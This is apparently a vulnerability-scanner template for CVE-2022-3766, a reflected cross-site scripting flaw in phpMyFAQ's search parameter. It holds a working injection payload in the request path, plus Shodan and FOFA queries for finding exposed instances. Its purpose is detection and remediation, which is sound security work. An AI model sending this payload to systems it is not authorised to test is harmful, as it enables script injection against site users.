http:
- matchers:
  - part: body
    type: word
    words:
    - value="1af" onclick='alert(document.domain)'
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/index.php?search=1af%22+onclick%3D''alert(document.domain)'''
id: CVE-2022-3766
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:phpmyfaq:phpmyfaq:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-3766
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.88411
    epss-score: 0.0424
  description: 'phpMyFAQ versions prior to 3.1.8 contain a reflected cross-site scripting
    vulnerability in the search functionality. The application fails to properly sanitize
    user input in the search parameter, allowing attackers to inject and execute malicious
    JavaScript code in the context of other users'' browsers.

    '
  impact: 'An attacker can Execute arbitrary JavaScript in victim''s browser context

    '
  metadata:
    fofa-query: body="phpmyfaq"
    max-request: 1
    product: phpmyfaq
    shodan-query: http.html:"phpmyfaq"
    vendor: phpmyfaq
    verified: true
  name: phpMyFAQ < 3.1.8 - Cross-Site Scripting
  reference:
  - https://huntr.dev/bounties/d9666520-4ff5-43bb-aacf-50c8e5570983
  - https://github.com/thorsten/phpMyFAQ/commit/c7904f2236c6c0dd64c2226b90c30af0f7e5a72d
  - https://nvd.nist.gov/vuln/detail/CVE-2022-3766
  remediation: 'Upgrade phpMyFAQ to version 3.1.8 or later

    '
  severity: medium
  tags: cve,cve2022,phpmyfaq,xss,vuln
